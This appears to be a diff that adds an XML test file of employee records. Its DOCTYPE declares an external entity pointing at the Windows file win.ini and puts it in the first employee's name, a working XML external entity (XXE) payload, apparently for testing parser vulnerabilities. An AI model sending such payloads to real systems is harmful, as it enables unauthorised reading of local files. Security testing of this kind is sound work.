@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE  name [ <!ENTITY xxe SYSTEM "C:\\Windows\\win.ini"> ]>  
+ <Employees>
+
+	<Employee ID="1">
+		<name>&xxe;</name>
+	</Employee>
+	
+	<Employee ID="2">
+		<name>Sam</name>
+	</Employee>
+	
+	<Employee ID="3">
+		<name>Jake</name>
+	</Employee>
+	
+	<Employee ID="4">
+		<name>Amy</name>
+	</Employee>
+	
+</Employees> 
+
